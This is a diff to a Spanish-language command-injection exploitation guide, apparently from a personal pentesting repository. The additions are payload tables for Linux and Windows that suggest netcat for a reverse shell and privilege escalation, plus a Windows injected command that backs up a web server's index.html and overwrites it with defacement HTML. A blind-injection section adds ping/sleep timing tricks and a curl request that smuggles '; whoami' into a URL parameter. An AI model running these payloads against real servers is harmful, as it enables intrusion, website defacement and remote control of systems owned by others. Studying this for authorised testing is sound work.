@@ -4,7 +4,7 @@
 
 Una vez que se encontró la vulnerabilidad `in-band` o `blind` se procede a explotar de las siguientes maneras: 
 
-### 💣 `In-Band CMDI: exploitation`
+## 💣 `In-Band CMDI: exploitation`
 
 1. 💥 Utilizar `shell metacharacters` como [payload](https://github.com/Fz3r0/Fz3r0_-_Command_Injection/blob/main/12_Fz3r0_CMDI_-_Payloads/Command_Injection_Payloads.md) inicial:
 
@@ -47,6 +47,28 @@ Una vez que se encontró la vulnerabilidad `in-band` o `blind` se procede a expl
 etc
 
 ````
+
+### Ejemplos de payloads:
+
+- `Linux`:
+
+| **Payload** | **Descripción**                                                                                                                                                                                                                       |   |
+|-------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|---|
+| whoami      | Muestra el usuario bajo el cual se está ejecutando la aplicación.                                                                                                                                                                     |   |
+| ls          | Lista el contenido del directorio actual. Puedes encontrar archivos como configuraciones, tokens y claves de aplicaciones, y muchas otras cosas valiosas.                                                                             |   |
+| ping        | Este comando provocará que la aplicación se quede colgada. Útil para probar una aplicación en busca de una inyección de comandos a ciegas.                                                                                            |   |
+| sleep       | Otro payload útil para probar una aplicación en busca de una inyección de comandos a ciegas, especialmente si la máquina no tiene instalado el comando ping.                                                                          |   |
+| nc          | Netcat se puede usar para generar una shell inversa en la aplicación vulnerable. Puedes utilizar este punto de apoyo para moverte por la máquina objetivo y buscar otros servicios, archivos o posibles formas de elevar privilegios. |   |
+
+- `Windows`:
+
+| **Payload** | **Descripción**                                                                                                                                                                                                                       |   |
+|-------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|---|
+| whoami      | Muestra el usuario bajo el cual se está ejecutando la aplicación.                                                                                                                                                                     |   |
+| dir         | Lista el contenido del directorio actual. Puedes encontrar archivos como configuraciones, tokens y claves de aplicaciones, y muchas otras cosas valiosas.                                                                             |   |
+| ping        | Este comando provocará que la aplicación se quede colgada. Útil para probar una aplicación en busca de una inyección de comandos a ciegas.                                                                                            |   |
+| timeout     | Este comando también provocará que la aplicación se quede colgada. Es útil para probar una aplicación en busca de una inyección de comandos a ciegas si el comando ping no está instalado.                                            |   |
+| nc          | Netcat se puede usar para generar una shell inversa en la aplicación vulnerable. Puedes utilizar este punto de apoyo para moverte por la máquina objetivo y buscar otros servicios, archivos o posibles formas de elevar privilegios. |   | 
 
 Algo un poco mas complejo como un `defacement` se podría ver algo así:
 
@@ -92,6 +114,27 @@ O algo todavía más complejo, esto ya es un código HTML para un buen defacemen
 ## Apache copiando original:
 127.0.0.1 & ren C:\mi_apache\www\index.html index.bak & copy NUL C:\mi_apache\www\index.html & echo ^<!DOCTYPE html^><html><head><title>Este es un título de prueba</title><style>body{background-color:black;color:white;}h1{color:yellow;}h2{color:cyan;}</style></head><body><h1>Este es el título Fz3r0</h1><h2>Este es el título 2 Fz3r0</h2><p style="color:red;">Este es el contenido en rojo y yo soy Fz3r0</p><img src="https://ejemplo.com/imagen.jpg" alt="Imagen de ejemplo"></body></html> > C:\mi_apache\www\index.html &
 
+````
+
+## 💣 `Out-Of-Band AKA "Blind" CMDI: exploitation`
+
+La inyección de comandos a ciegas o `blind`, ocurre cuando se produce una inyección de comandos; sin embargo, no hay una salida visible, por lo que no es inmediatamente detectable. Por ejemplo, se ejecuta un comando, pero la aplicación web no muestra ningún mensaje.
+
+Para este tipo de inyección de comandos, necesitaremos utilizar payloads que causen cierto retraso en el tiempo. Por ejemplo, los comandos `ping` y `sleep` son payloads que normalmente se utilizan para probar. 
+
+- Usando `ping` como ejemplo, la aplicación se quedará colgada durante x segundos en relación con la cantidad de pings que hayas especificado.
+
+Otro método para detectar la inyección de comandos a ciegas es forzando alguna salida o `output`. Esto se puede lograr utilizando operadores de redirección como `>` de Linux. 
+
+- Por ejemplo, podemos indicarle a la aplicación web que ejecute comandos como `whoami` y redireccionarlos a un archivo.
+- Luego, podemos utilizar un comando como `cat` para leer el contenido de este archivo recién creado.
+- El comando `curl` es una excelente manera de probar la inyección de comandos. Esto se debe a que puedes usar `curl` para enviar y recibir datos desde una aplicación en tu payload.
+- Probar la inyección de comandos de esta manera a menudo es complicado y requiere bastante experimentación, especialmente porque la sintaxis de los comandos varía entre `Linux` y `Windows`.
+
+Por ejemplo, un payload simple de curl a una aplicación es posible para la inyección de comandos como el siguiente:
+
+````sh
+curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami
 ````
 
 ## 📖 Recursos
